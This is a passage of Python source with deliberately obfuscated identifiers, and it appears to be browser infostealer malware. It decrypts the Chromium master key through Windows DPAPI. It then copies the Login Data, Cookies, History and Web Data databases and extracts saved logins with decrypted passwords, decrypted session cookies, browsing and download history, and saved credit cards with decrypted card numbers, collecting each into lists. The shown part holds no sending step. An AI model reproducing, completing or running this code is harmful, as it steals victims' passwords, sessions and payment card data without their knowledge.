        NXKWQTOBBMWMMBCCDTZICZSNGOTKGJAOHAXIQKZMJYABESVSTPRVGQZZHWDZJI = []
        NLROFAWVCMVAKWQXBJSCJLDSMZJHFRPBHGRMGVNWUBIKJTBXOBWBWPQOVLNSWEORFCBKT = 0
    else:
        NXKWQTOBBMWMMBCCDTZICZSNGOTKGJAOHAXIQKZMJYABESVSTPRVGQZZHWDZJI = ""
        NLROFAWVCMVAKWQXBJSCJLDSMZJHFRPBHGRMGVNWUBIKJTBXOBWBWPQOVLNSWEORFCBKT = None
    if "cards" in OQPXKHAVSGYGAUBGFSLPWCNTUYJRLGKMLQDHYRFUFIJLWCGWAGTBSUUEFHZFLMXAVDXXCPGTPF:
        EBRVNEBOLAKCMXEWZBTPYZWKJVNEIXJDVROCMVUINNEUYAABIMPBTPHIAKWMVCYUTEQ = []
        ONTSQMPWCLQTYFECSAZNGMROSZDWQCZORBTHKXODHIIBPLUVPMUWYAGALQQTNWVVERHCIXDYSQCE = 0
    else:
        EBRVNEBOLAKCMXEWZBTPYZWKJVNEIXJDVROCMVUINNEUYAABIMPBTPHIAKWMVCYUTEQ = ""
        ONTSQMPWCLQTYFECSAZNGMROSZDWQCZORBTHKXODHIIBPLUVPMUWYAGALQQTNWVVERHCIXDYSQCE = None
    
    def EXNPYQCEWBCCFBQLNUXKUAVXUJEKEYSNYBRYNMSTACQJEKSVMSSCKRVQHHBIKGHKZFAEELNKDYQFXNYDHXFY(BAVGGPAIVSZHTNTSCTVJSLFTOWWFURIVVVFTCPTSPDWJUZVIUXBYMVRXFHIDREUXZLFCLWHZDZVHTYCEFPAUWXPQCUQ):
        if not os.path.exists(BAVGGPAIVSZHTNTSCTVJSLFTOWWFURIVVVFTCPTSPDWJUZVIUXBYMVRXFHIDREUXZLFCLWHZDZVHTYCEFPAUWXPQCUQ):
            return None

        try:
            with open(BAVGGPAIVSZHTNTSCTVJSLFTOWWFURIVVVFTCPTSPDWJUZVIUXBYMVRXFHIDREUXZLFCLWHZDZVHTYCEFPAUWXPQCUQ, 'r', encoding='utf-8') as v4r_f:
                IGCCUYUQDJPCHALKBFVHYUKENSXVLPHNRCJLYSBOTKVNAZKYGDSNZZZCS = json.load(v4r_f)

            OHKVSYDAYQVFWXPKYKCJDHDUEIKPGJUIJWSORPPIXRWXHOQXCTWQST_key = base64.b64decode(IGCCUYUQDJPCHALKBFVHYUKENSXVLPHNRCJLYSBOTKVNAZKYGDSNZZZCS["os_crypt"]["encrypted_key"])[5:]
            FCLEQHINZFJLWCTMAFKIWHKAHZCJKRNQTZKXJHAXUAMYJSWMNQPKEDPPFOJRYZWBIQSHCM = win32crypt.CryptUnprotectData(OHKVSYDAYQVFWXPKYKCJDHDUEIKPGJUIJWSORPPIXRWXHOQXCTWQST_key, None, None, None, 0)[1]
            return FCLEQHINZFJLWCTMAFKIWHKAHZCJKRNQTZKXJHAXUAMYJSWMNQPKEDPPFOJRYZWBIQSHCM
        except:
            return None

    def ZDSNZWOYTHNBFKJSWQHPILSTVSBDQXZKAZDMXISTBAHLWBAOKYKIUZMTRLLLENHXGPXDGVCCRSOOCAHBRVFTHMZKL(IZYEBNTQJDIBYEVKWOXNVQSAVCGXOVZUMIFZJCEXFZHMGCTFWYSDTHXCBMKEYNGGNM, FCLEQHINZFJLWCTMAFKIWHKAHZCJKRNQTZKXJHAXUAMYJSWMNQPKEDPPFOJRYZWBIQSHCM):
        try:
            WCYNCEJVNSLWPHUWNEFQBMCOFWTASEDBDXPKUPCXHSFSOYBZFUEWOQNCCUNEPLNFUKJRCXDIKT = IZYEBNTQJDIBYEVKWOXNVQSAVCGXOVZUMIFZJCEXFZHMGCTFWYSDTHXCBMKEYNGGNM[3:15]
            KPKSCHWFYAYPEYDJQISNTXESXQNKMYCVKRKQOTOSVTKCXOBLRIDVBGLCSUGSSWUOEREQUCIMNQYODBMCXP = IZYEBNTQJDIBYEVKWOXNVQSAVCGXOVZUMIFZJCEXFZHMGCTFWYSDTHXCBMKEYNGGNM[15:-16]
            TOBQLOVISTAAQPWBNYNGHWBESAWOMEKDBZRGNEDJYTXCVZCMHGHMAQ = IZYEBNTQJDIBYEVKWOXNVQSAVCGXOVZUMIFZJCEXFZHMGCTFWYSDTHXCBMKEYNGGNM[-16:]
            FEHRFYRUREAIUXLKVTQSUDXCFNSAEZAHXABIFLRKDWPOREKMWDUNWYSBLDR = Cipher(algorithms.AES(FCLEQHINZFJLWCTMAFKIWHKAHZCJKRNQTZKXJHAXUAMYJSWMNQPKEDPPFOJRYZWBIQSHCM), modes.GCM(WCYNCEJVNSLWPHUWNEFQBMCOFWTASEDBDXPKUPCXHSFSOYBZFUEWOQNCCUNEPLNFUKJRCXDIKT, TOBQLOVISTAAQPWBNYNGHWBESAWOMEKDBZRGNEDJYTXCVZCMHGHMAQ))
            YGNHKEYVPYXIIHSZCASEZLLKQYYOJVIHPTSUFWOREPAXSZOOWYGMEZMYHOAELDFDLHUI = FEHRFYRUREAIUXLKVTQSUDXCFNSAEZAHXABIFLRKDWPOREKMWDUNWYSBLDR.decryptor()
            QOHIJNNNTGUJSLCBIXOTVPRYPFUNUELWCTMLCDWAKANUSBJHUQMXRJJLTBQQPN = YGNHKEYVPYXIIHSZCASEZLLKQYYOJVIHPTSUFWOREPAXSZOOWYGMEZMYHOAELDFDLHUI.update(KPKSCHWFYAYPEYDJQISNTXESXQNKMYCVKRKQOTOSVTKCXOBLRIDVBGLCSUGSSWUOEREQUCIMNQYODBMCXP) + YGNHKEYVPYXIIHSZCASEZLLKQYYOJVIHPTSUFWOREPAXSZOOWYGMEZMYHOAELDFDLHUI.finalize()
            return QOHIJNNNTGUJSLCBIXOTVPRYPFUNUELWCTMLCDWAKANUSBJHUQMXRJJLTBQQPN.decode()
        except:
            return None
        
    def ZJHAWTSGCTRQDVFAQLTUHEIKSGGXYXWANKNKLOGZRSPJUVSLQKTQXZHSESBULIGWGH(LIUDXPVLXDQIQYSLGUWIONCHKTSIJMKVWNHELRYJADETUVJLRNEAPKRLULRB, QSGRHOAPVRCBHQAAKDUTGUKFZGYVAYTQPRJNUZIQILOKSWZQUOVDOAZAJCPIYQGEMUVQFURKGXZNABUJSZWTBBCSDYEXSHDH, FCLEQHINZFJLWCTMAFKIWHKAHZCJKRNQTZKXJHAXUAMYJSWMNQPKEDPPFOJRYZWBIQSHCM):
        global FAWAAXTMWEVTLOTLEBHHAQGXIYXZYVMIQDAYQZWKVEGSKGSGTD
        UCHHVNFCLHUOLYYESBDKLFQODSICPABEPTKUJGNZYCHYGILOAPSLTXBGWMYCCMLJZORKWVCBZBWRA_db = os.path.join(QSGRHOAPVRCBHQAAKDUTGUKFZGYVAYTQPRJNUZIQILOKSWZQUOVDOAZAJCPIYQGEMUVQFURKGXZNABUJSZWTBBCSDYEXSHDH, 'Login Data')
        if not os.path.exists(UCHHVNFCLHUOLYYESBDKLFQODSICPABEPTKUJGNZYCHYGILOAPSLTXBGWMYCCMLJZORKWVCBZBWRA_db):
            return

        SRSQAIERAQTTKBFWXIGFRQMKMETMMNFEQPQBUXJUJLXKAYTYDDZ = sqlite3.connect(":memory:")
        MNHOAUFBNFBYKWXZQPRVJRUTEADUMYNRBGOLSHPMRBBEFTOYIYTLCZURAIOPI = sqlite3.connect(UCHHVNFCLHUOLYYESBDKLFQODSICPABEPTKUJGNZYCHYGILOAPSLTXBGWMYCCMLJZORKWVCBZBWRA_db)
        MNHOAUFBNFBYKWXZQPRVJRUTEADUMYNRBGOLSHPMRBBEFTOYIYTLCZURAIOPI.backup(SRSQAIERAQTTKBFWXIGFRQMKMETMMNFEQPQBUXJUJLXKAYTYDDZ)
        MNHOAUFBNFBYKWXZQPRVJRUTEADUMYNRBGOLSHPMRBBEFTOYIYTLCZURAIOPI.close()
        EASCTJWMGDMNPEBZCIEWOWVVCLLTLRRCRPYNPIOGLUNXOOTRBFKCPUEFGJWP = SRSQAIERAQTTKBFWXIGFRQMKMETMMNFEQPQBUXJUJLXKAYTYDDZ.cursor()
        EASCTJWMGDMNPEBZCIEWOWVVCLLTLRRCRPYNPIOGLUNXOOTRBFKCPUEFGJWP.execute('SELECT action_url, username_value, password_value FROM logins')

        for v4r_row in EASCTJWMGDMNPEBZCIEWOWVVCLLTLRRCRPYNPIOGLUNXOOTRBFKCPUEFGJWP.fetchall():
            if not v4r_row[0] or not v4r_row[1] or not v4r_row[2]:
                continue
            HTPLQHWEFZIFCUMZREORJCUYGANUAVNKGVSGLRJMCFJDEGZSFLSDUQAXWHQ =          f"- Url      : {v4r_row[0]}"
            AUAEJBAXZIEKUBOVBMNWGPJXPZFWPIBQBVJWMLYZYVMODVBNSL =     f"  Username : {v4r_row[1]}"
            UCHHVNFCLHUOLYYESBDKLFQODSICPABEPTKUJGNZYCHYGILOAPSLTXBGWMYCCMLJZORKWVCBZBWRA =     f"  Password : {ZDSNZWOYTHNBFKJSWQHPILSTVSBDQXZKAZDMXISTBAHLWBAOKYKIUZMTRLLLENHXGPXDGVCCRSOOCAHBRVFTHMZKL(v4r_row[2], FCLEQHINZFJLWCTMAFKIWHKAHZCJKRNQTZKXJHAXUAMYJSWMNQPKEDPPFOJRYZWBIQSHCM)}"
            LIUDXPVLXDQIQYSLGUWIONCHKTSIJMKVWNHELRYJADETUVJLRNEAPKRLULRB_name = f"  Browser  : {LIUDXPVLXDQIQYSLGUWIONCHKTSIJMKVWNHELRYJADETUVJLRNEAPKRLULRB}"
            BWITGKALYLVOLFFDCXBOVLNELIKAPKXJPBBDGCVOHPTNVWDZRYZWEJSZCGRXMOVDBIPQPPVJQAISVDVPAT.append(f"{HTPLQHWEFZIFCUMZREORJCUYGANUAVNKGVSGLRJMCFJDEGZSFLSDUQAXWHQ}\n{AUAEJBAXZIEKUBOVBMNWGPJXPZFWPIBQBVJWMLYZYVMODVBNSL}\n{UCHHVNFCLHUOLYYESBDKLFQODSICPABEPTKUJGNZYCHYGILOAPSLTXBGWMYCCMLJZORKWVCBZBWRA}\n{LIUDXPVLXDQIQYSLGUWIONCHKTSIJMKVWNHELRYJADETUVJLRNEAPKRLULRB_name}\n")
            FAWAAXTMWEVTLOTLEBHHAQGXIYXZYVMIQDAYQZWKVEGSKGSGTD += 1

        SRSQAIERAQTTKBFWXIGFRQMKMETMMNFEQPQBUXJUJLXKAYTYDDZ.close()

    def IXLUGFXHJQYSFQLOSOPYJUTHQYHNLUDNWTVSVNPKLSNAQVUQWLKFGFYAMMLVWIWPPUGKPLJHBGDITEG(LIUDXPVLXDQIQYSLGUWIONCHKTSIJMKVWNHELRYJADETUVJLRNEAPKRLULRB, QSGRHOAPVRCBHQAAKDUTGUKFZGYVAYTQPRJNUZIQILOKSWZQUOVDOAZAJCPIYQGEMUVQFURKGXZNABUJSZWTBBCSDYEXSHDH, FCLEQHINZFJLWCTMAFKIWHKAHZCJKRNQTZKXJHAXUAMYJSWMNQPKEDPPFOJRYZWBIQSHCM):
        global VQLXERIPIRMAORMXEUFRKMVDGZRUTMGHOOPWUPNBFEEGURIEAU
        KMDHHGBYPOFAOCWHIPWSBFVJIKASRWDYHTXISJAKRPFQBJCWCMSCVD = os.path.join(QSGRHOAPVRCBHQAAKDUTGUKFZGYVAYTQPRJNUZIQILOKSWZQUOVDOAZAJCPIYQGEMUVQFURKGXZNABUJSZWTBBCSDYEXSHDH, 'Network', 'Cookies')
        if not os.path.exists(KMDHHGBYPOFAOCWHIPWSBFVJIKASRWDYHTXISJAKRPFQBJCWCMSCVD):
            return

        SRSQAIERAQTTKBFWXIGFRQMKMETMMNFEQPQBUXJUJLXKAYTYDDZ = sqlite3.connect(":memory:")
        MNHOAUFBNFBYKWXZQPRVJRUTEADUMYNRBGOLSHPMRBBEFTOYIYTLCZURAIOPI = sqlite3.connect(KMDHHGBYPOFAOCWHIPWSBFVJIKASRWDYHTXISJAKRPFQBJCWCMSCVD)
        MNHOAUFBNFBYKWXZQPRVJRUTEADUMYNRBGOLSHPMRBBEFTOYIYTLCZURAIOPI.backup(SRSQAIERAQTTKBFWXIGFRQMKMETMMNFEQPQBUXJUJLXKAYTYDDZ)
        MNHOAUFBNFBYKWXZQPRVJRUTEADUMYNRBGOLSHPMRBBEFTOYIYTLCZURAIOPI.close()
        EASCTJWMGDMNPEBZCIEWOWVVCLLTLRRCRPYNPIOGLUNXOOTRBFKCPUEFGJWP = SRSQAIERAQTTKBFWXIGFRQMKMETMMNFEQPQBUXJUJLXKAYTYDDZ.cursor()
        EASCTJWMGDMNPEBZCIEWOWVVCLLTLRRCRPYNPIOGLUNXOOTRBFKCPUEFGJWP.execute('SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies')

        for v4r_row in EASCTJWMGDMNPEBZCIEWOWVVCLLTLRRCRPYNPIOGLUNXOOTRBFKCPUEFGJWP.fetchall():
            if not v4r_row[0] or not v4r_row[1] or not v4r_row[2] or not v4r_row[3]:
                continue
            HTPLQHWEFZIFCUMZREORJCUYGANUAVNKGVSGLRJMCFJDEGZSFLSDUQAXWHQ =          f"- Url     : {v4r_row[0]}"
            GWJMVGJNKPFBVAFVPYBHODQPBGWSROODSRDCBCGTHCBVIEYGWSKGMYIXVVDLON =         f"  Name    : {v4r_row[1]}"
            BAVGGPAIVSZHTNTSCTVJSLFTOWWFURIVVVFTCPTSPDWJUZVIUXBYMVRXFHIDREUXZLFCLWHZDZVHTYCEFPAUWXPQCUQ =         f"  Path    : {v4r_row[2]}"
            IWVPWBZZWVMXSCTFGBILOAKHRWFDWVLNOIAEEFSUZNOHOWQOLRRMADFKWJNBCHUPJXBLELMCYG =       f"  Cookie  : {ZDSNZWOYTHNBFKJSWQHPILSTVSBDQXZKAZDMXISTBAHLWBAOKYKIUZMTRLLLENHXGPXDGVCCRSOOCAHBRVFTHMZKL(v4r_row[3], FCLEQHINZFJLWCTMAFKIWHKAHZCJKRNQTZKXJHAXUAMYJSWMNQPKEDPPFOJRYZWBIQSHCM)}"
            CRWWTVFYXNNTOVZEAEVRAEGAJZOJDBESGWYQCLNVNWUWQRBADXTPRIVJSOTYGNQLRGHLKPMNQ =       f"  Expire  : {v4r_row[4]}"
            LIUDXPVLXDQIQYSLGUWIONCHKTSIJMKVWNHELRYJADETUVJLRNEAPKRLULRB_name = f"  Browser : {LIUDXPVLXDQIQYSLGUWIONCHKTSIJMKVWNHELRYJADETUVJLRNEAPKRLULRB}"
            MWYXHIGSGTMDTBWJLTYXXIUPVREOJNLXCYLIVDXTNPLMOZPSLYHKCAAHAMVAOAYBDW.append(f"{HTPLQHWEFZIFCUMZREORJCUYGANUAVNKGVSGLRJMCFJDEGZSFLSDUQAXWHQ}\n{GWJMVGJNKPFBVAFVPYBHODQPBGWSROODSRDCBCGTHCBVIEYGWSKGMYIXVVDLON}\n{BAVGGPAIVSZHTNTSCTVJSLFTOWWFURIVVVFTCPTSPDWJUZVIUXBYMVRXFHIDREUXZLFCLWHZDZVHTYCEFPAUWXPQCUQ}\n{IWVPWBZZWVMXSCTFGBILOAKHRWFDWVLNOIAEEFSUZNOHOWQOLRRMADFKWJNBCHUPJXBLELMCYG}\n{CRWWTVFYXNNTOVZEAEVRAEGAJZOJDBESGWYQCLNVNWUWQRBADXTPRIVJSOTYGNQLRGHLKPMNQ}\n{LIUDXPVLXDQIQYSLGUWIONCHKTSIJMKVWNHELRYJADETUVJLRNEAPKRLULRB_name}\n")
            VQLXERIPIRMAORMXEUFRKMVDGZRUTMGHOOPWUPNBFEEGURIEAU += 1

        SRSQAIERAQTTKBFWXIGFRQMKMETMMNFEQPQBUXJUJLXKAYTYDDZ.close()

    def IZGLNUMWTMUJAWVLWKESZQPBCQFXULNFYRGHQLFAQBOWHYROVXVRQWM(LIUDXPVLXDQIQYSLGUWIONCHKTSIJMKVWNHELRYJADETUVJLRNEAPKRLULRB, QSGRHOAPVRCBHQAAKDUTGUKFZGYVAYTQPRJNUZIQILOKSWZQUOVDOAZAJCPIYQGEMUVQFURKGXZNABUJSZWTBBCSDYEXSHDH):
        global UXIJLRJVJNSHZQECWARFRQJWCONJFCKDQMQMAVXRCGJKWMUPAYFXNSIRKAKFLIDSHHKDLOAMS
        NVMSWZMUXBUKXGMFRQVHASVQJXYLNXKFCKYYNVWFRVBMVNEFJBKSCIAJOAOJKWVSVDM = os.path.join(QSGRHOAPVRCBHQAAKDUTGUKFZGYVAYTQPRJNUZIQILOKSWZQUOVDOAZAJCPIYQGEMUVQFURKGXZNABUJSZWTBBCSDYEXSHDH, 'History')
        if not os.path.exists(NVMSWZMUXBUKXGMFRQVHASVQJXYLNXKFCKYYNVWFRVBMVNEFJBKSCIAJOAOJKWVSVDM):
            return
        
        SRSQAIERAQTTKBFWXIGFRQMKMETMMNFEQPQBUXJUJLXKAYTYDDZ = sqlite3.connect(":memory:")
        MNHOAUFBNFBYKWXZQPRVJRUTEADUMYNRBGOLSHPMRBBEFTOYIYTLCZURAIOPI = sqlite3.connect(NVMSWZMUXBUKXGMFRQVHASVQJXYLNXKFCKYYNVWFRVBMVNEFJBKSCIAJOAOJKWVSVDM)
        MNHOAUFBNFBYKWXZQPRVJRUTEADUMYNRBGOLSHPMRBBEFTOYIYTLCZURAIOPI.backup(SRSQAIERAQTTKBFWXIGFRQMKMETMMNFEQPQBUXJUJLXKAYTYDDZ)
        MNHOAUFBNFBYKWXZQPRVJRUTEADUMYNRBGOLSHPMRBBEFTOYIYTLCZURAIOPI.close()
        EASCTJWMGDMNPEBZCIEWOWVVCLLTLRRCRPYNPIOGLUNXOOTRBFKCPUEFGJWP = SRSQAIERAQTTKBFWXIGFRQMKMETMMNFEQPQBUXJUJLXKAYTYDDZ.cursor()
        EASCTJWMGDMNPEBZCIEWOWVVCLLTLRRCRPYNPIOGLUNXOOTRBFKCPUEFGJWP.execute('SELECT url, title, last_visit_time FROM urls')

        for v4r_row in EASCTJWMGDMNPEBZCIEWOWVVCLLTLRRCRPYNPIOGLUNXOOTRBFKCPUEFGJWP.fetchall():
            if not v4r_row[0] or not v4r_row[1] or not v4r_row[2]:
                continue
            HTPLQHWEFZIFCUMZREORJCUYGANUAVNKGVSGLRJMCFJDEGZSFLSDUQAXWHQ =          f"- Url     : {v4r_row[0]}"
            EODFGFMGMMBPSRYAVAHRKEKVGYVSSWSJYJVAEOBFLUAMYOUHKHLYJWKBWCDIXUSOQVMEZE =        f"  Title   : {v4r_row[1]}"
            CEBPWFGAPNXIOBTQCCUBPHCTJCCJFZMVBDWILQQZTHYUBPNPFSTLBOUUVULRJGYRVUSEWICJTTVMKEIXDFUWFTCOFERGNJ =         f"  Time    : {v4r_row[2]}"
            LIUDXPVLXDQIQYSLGUWIONCHKTSIJMKVWNHELRYJADETUVJLRNEAPKRLULRB_name = f"  Browser : {LIUDXPVLXDQIQYSLGUWIONCHKTSIJMKVWNHELRYJADETUVJLRNEAPKRLULRB}"
            LACHLPTKXTRWPDAKOXDBPKOELPDCFXBHKXWZUDTNOFCBHQFGKMXOSASSSZPFNZTMLSXAUAQQCZTTTLLQKP.append(f"{HTPLQHWEFZIFCUMZREORJCUYGANUAVNKGVSGLRJMCFJDEGZSFLSDUQAXWHQ}\n{EODFGFMGMMBPSRYAVAHRKEKVGYVSSWSJYJVAEOBFLUAMYOUHKHLYJWKBWCDIXUSOQVMEZE}\n{CEBPWFGAPNXIOBTQCCUBPHCTJCCJFZMVBDWILQQZTHYUBPNPFSTLBOUUVULRJGYRVUSEWICJTTVMKEIXDFUWFTCOFERGNJ}\n{LIUDXPVLXDQIQYSLGUWIONCHKTSIJMKVWNHELRYJADETUVJLRNEAPKRLULRB_name}\n")
            UXIJLRJVJNSHZQECWARFRQJWCONJFCKDQMQMAVXRCGJKWMUPAYFXNSIRKAKFLIDSHHKDLOAMS += 1

        SRSQAIERAQTTKBFWXIGFRQMKMETMMNFEQPQBUXJUJLXKAYTYDDZ.close()
    
    def VSLTNYQMPKPPQTORURQTGJYCBBJCMZJBKVSJYVBTBCVBYCRRSTKGPQYGJAABDMEIDDTAHR(LIUDXPVLXDQIQYSLGUWIONCHKTSIJMKVWNHELRYJADETUVJLRNEAPKRLULRB, QSGRHOAPVRCBHQAAKDUTGUKFZGYVAYTQPRJNUZIQILOKSWZQUOVDOAZAJCPIYQGEMUVQFURKGXZNABUJSZWTBBCSDYEXSHDH):
        global NLROFAWVCMVAKWQXBJSCJLDSMZJHFRPBHGRMGVNWUBIKJTBXOBWBWPQOVLNSWEORFCBKT
        WASJYEZQTAOLDJMYAYEEDTLEDYQNXCYNJWHDJIRWIEPWFJAXTPKLSCGBLNBXFIUOYPFMBGBADFQOAGELUSZWUTHJIXPB = os.path.join(QSGRHOAPVRCBHQAAKDUTGUKFZGYVAYTQPRJNUZIQILOKSWZQUOVDOAZAJCPIYQGEMUVQFURKGXZNABUJSZWTBBCSDYEXSHDH, 'History')
        if not os.path.exists(WASJYEZQTAOLDJMYAYEEDTLEDYQNXCYNJWHDJIRWIEPWFJAXTPKLSCGBLNBXFIUOYPFMBGBADFQOAGELUSZWUTHJIXPB):
            return

        SRSQAIERAQTTKBFWXIGFRQMKMETMMNFEQPQBUXJUJLXKAYTYDDZ = sqlite3.connect(":memory:")
        MNHOAUFBNFBYKWXZQPRVJRUTEADUMYNRBGOLSHPMRBBEFTOYIYTLCZURAIOPI = sqlite3.connect(WASJYEZQTAOLDJMYAYEEDTLEDYQNXCYNJWHDJIRWIEPWFJAXTPKLSCGBLNBXFIUOYPFMBGBADFQOAGELUSZWUTHJIXPB)
        MNHOAUFBNFBYKWXZQPRVJRUTEADUMYNRBGOLSHPMRBBEFTOYIYTLCZURAIOPI.backup(SRSQAIERAQTTKBFWXIGFRQMKMETMMNFEQPQBUXJUJLXKAYTYDDZ)
        MNHOAUFBNFBYKWXZQPRVJRUTEADUMYNRBGOLSHPMRBBEFTOYIYTLCZURAIOPI.close()
        EASCTJWMGDMNPEBZCIEWOWVVCLLTLRRCRPYNPIOGLUNXOOTRBFKCPUEFGJWP = SRSQAIERAQTTKBFWXIGFRQMKMETMMNFEQPQBUXJUJLXKAYTYDDZ.cursor()
        EASCTJWMGDMNPEBZCIEWOWVVCLLTLRRCRPYNPIOGLUNXOOTRBFKCPUEFGJWP.execute('SELECT tab_url, target_path FROM downloads')
        for row in EASCTJWMGDMNPEBZCIEWOWVVCLLTLRRCRPYNPIOGLUNXOOTRBFKCPUEFGJWP.fetchall():
            if not row[0] or not row[1]:
                continue
            BAVGGPAIVSZHTNTSCTVJSLFTOWWFURIVVVFTCPTSPDWJUZVIUXBYMVRXFHIDREUXZLFCLWHZDZVHTYCEFPAUWXPQCUQ =         f"- Path    : {row[1]}"
            HTPLQHWEFZIFCUMZREORJCUYGANUAVNKGVSGLRJMCFJDEGZSFLSDUQAXWHQ =          f"  Url     : {row[0]}"
            LIUDXPVLXDQIQYSLGUWIONCHKTSIJMKVWNHELRYJADETUVJLRNEAPKRLULRB_name = f"  Browser : {LIUDXPVLXDQIQYSLGUWIONCHKTSIJMKVWNHELRYJADETUVJLRNEAPKRLULRB}"
            NXKWQTOBBMWMMBCCDTZICZSNGOTKGJAOHAXIQKZMJYABESVSTPRVGQZZHWDZJI.append(f"{BAVGGPAIVSZHTNTSCTVJSLFTOWWFURIVVVFTCPTSPDWJUZVIUXBYMVRXFHIDREUXZLFCLWHZDZVHTYCEFPAUWXPQCUQ}\n{HTPLQHWEFZIFCUMZREORJCUYGANUAVNKGVSGLRJMCFJDEGZSFLSDUQAXWHQ}\n{LIUDXPVLXDQIQYSLGUWIONCHKTSIJMKVWNHELRYJADETUVJLRNEAPKRLULRB_name}\n")
            NLROFAWVCMVAKWQXBJSCJLDSMZJHFRPBHGRMGVNWUBIKJTBXOBWBWPQOVLNSWEORFCBKT += 1

        SRSQAIERAQTTKBFWXIGFRQMKMETMMNFEQPQBUXJUJLXKAYTYDDZ.close()
    
    def YOTKYAEMGJDHGBXYJVDDQQKCXPJWPHANVEPWYDVEAQTDNCIVBGLOKWTGWZVUSZPOZKGDMSHQVEOVZTRRDZMCEELAAT(LIUDXPVLXDQIQYSLGUWIONCHKTSIJMKVWNHELRYJADETUVJLRNEAPKRLULRB, QSGRHOAPVRCBHQAAKDUTGUKFZGYVAYTQPRJNUZIQILOKSWZQUOVDOAZAJCPIYQGEMUVQFURKGXZNABUJSZWTBBCSDYEXSHDH, FCLEQHINZFJLWCTMAFKIWHKAHZCJKRNQTZKXJHAXUAMYJSWMNQPKEDPPFOJRYZWBIQSHCM):
        global ONTSQMPWCLQTYFECSAZNGMROSZDWQCZORBTHKXODHIIBPLUVPMUWYAGALQQTNWVVERHCIXDYSQCE
        YJMWYKCBJEEOJZBUJAFGRILFIQNFSDWWUZVSOWRJCZOVAUACFIHZEACGWIOAQXSAFGJYTJGLSMXIWSTQWSRVNGBGGQGUKUJMS = os.path.join(QSGRHOAPVRCBHQAAKDUTGUKFZGYVAYTQPRJNUZIQILOKSWZQUOVDOAZAJCPIYQGEMUVQFURKGXZNABUJSZWTBBCSDYEXSHDH, 'Web Data')
        if not os.path.exists(YJMWYKCBJEEOJZBUJAFGRILFIQNFSDWWUZVSOWRJCZOVAUACFIHZEACGWIOAQXSAFGJYTJGLSMXIWSTQWSRVNGBGGQGUKUJMS):
            return

        SRSQAIERAQTTKBFWXIGFRQMKMETMMNFEQPQBUXJUJLXKAYTYDDZ = sqlite3.connect(":memory:")
        MNHOAUFBNFBYKWXZQPRVJRUTEADUMYNRBGOLSHPMRBBEFTOYIYTLCZURAIOPI = sqlite3.connect(YJMWYKCBJEEOJZBUJAFGRILFIQNFSDWWUZVSOWRJCZOVAUACFIHZEACGWIOAQXSAFGJYTJGLSMXIWSTQWSRVNGBGGQGUKUJMS)
        MNHOAUFBNFBYKWXZQPRVJRUTEADUMYNRBGOLSHPMRBBEFTOYIYTLCZURAIOPI.backup(SRSQAIERAQTTKBFWXIGFRQMKMETMMNFEQPQBUXJUJLXKAYTYDDZ)
        MNHOAUFBNFBYKWXZQPRVJRUTEADUMYNRBGOLSHPMRBBEFTOYIYTLCZURAIOPI.close()
        EASCTJWMGDMNPEBZCIEWOWVVCLLTLRRCRPYNPIOGLUNXOOTRBFKCPUEFGJWP = SRSQAIERAQTTKBFWXIGFRQMKMETMMNFEQPQBUXJUJLXKAYTYDDZ.cursor()
        EASCTJWMGDMNPEBZCIEWOWVVCLLTLRRCRPYNPIOGLUNXOOTRBFKCPUEFGJWP.execute('SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards')

        for v4r_row in EASCTJWMGDMNPEBZCIEWOWVVCLLTLRRCRPYNPIOGLUNXOOTRBFKCPUEFGJWP.fetchall():
            if not v4r_row[0] or not v4r_row[1] or not v4r_row[2] or not v4r_row[3]:
                continue
            GWJMVGJNKPFBVAFVPYBHODQPBGWSROODSRDCBCGTHCBVIEYGWSKGMYIXVVDLON =             f"- Name             : {v4r_row[0]}"
            OUFPLUJXIGFWVJVILWRLJFROJCTCNPQMNBBSJIZRQZRALMNKUBKABEZCJPAFHJMAUTFCQKXMLTCCMAPX = f"  Expiration Month : {v4r_row[1]}"
            CXFIPLHVEXTIMGBCNRNADLESSKROVFDIPFIJFFMDUJJJLLWTHGSNPFJCJGUCBVYIMLTJ =  f"  Expiration Year  : {v4r_row[2]}"
            DCZBYKGTOHQFNEHEOJGTQGUTEOSZEDJXKZOMTJMHNJCXLXQQJKQQGRMZJXMXJGQIWHDUUSCU =      f"  Card Number      : {ZDSNZWOYTHNBFKJSWQHPILSTVSBDQXZKAZDMXISTBAHLWBAOKYKIUZMTRLLLENHXGPXDGVCCRSOOCAHBRVFTHMZKL(v4r_row[3], FCLEQHINZFJLWCTMAFKIWHKAHZCJKRNQTZKXJHAXUAMYJSWMNQPKEDPPFOJRYZWBIQSHCM)}"
            PFXOTMMMGNKPYBVDBRZVONKCJDZZAGVEZQUZPTEQADDFRAEMGXEOGFJKFLFWYFZGDPHPGJMCZHRPGVY =    f"  Date Modified    : {v4r_row[4]}"
            LIUDXPVLXDQIQYSLGUWIONCHKTSIJMKVWNHELRYJADETUVJLRNEAPKRLULRB_name =     f"  Browser          : {LIUDXPVLXDQIQYSLGUWIONCHKTSIJMKVWNHELRYJADETUVJLRNEAPKRLULRB}"
            EBRVNEBOLAKCMXEWZBTPYZWKJVNEIXJDVROCMVUINNEUYAABIMPBTPHIAKWMVCYUTEQ.append(f"{GWJMVGJNKPFBVAFVPYBHODQPBGWSROODSRDCBCGTHCBVIEYGWSKGMYIXVVDLON}\n{OUFPLUJXIGFWVJVILWRLJFROJCTCNPQMNBBSJIZRQZRALMNKUBKABEZCJPAFHJMAUTFCQKXMLTCCMAPX}\n{CXFIPLHVEXTIMGBCNRNADLESSKROVFDIPFIJFFMDUJJJLLWTHGSNPFJCJGUCBVYIMLTJ}\n{DCZBYKGTOHQFNEHEOJGTQGUTEOSZEDJXKZOMTJMHNJCXLXQQJKQQGRMZJXMXJGQIWHDUUSCU}\n{PFXOTMMMGNKPYBVDBRZVONKCJDZZAGVEZQUZPTEQADDFRAEMGXEOGFJKFLFWYFZGDPHPGJMCZHRPGVY}\n{LIUDXPVLXDQIQYSLGUWIONCHKTSIJMKVWNHELRYJADETUVJLRNEAPKRLULRB_name}\n")
            ONTSQMPWCLQTYFECSAZNGMROSZDWQCZORBTHKXODHIIBPLUVPMUWYAGALQQTNWVVERHCIXDYSQCE += 1
        
        SRSQAIERAQTTKBFWXIGFRQMKMETMMNFEQPQBUXJUJLXKAYTYDDZ.close()

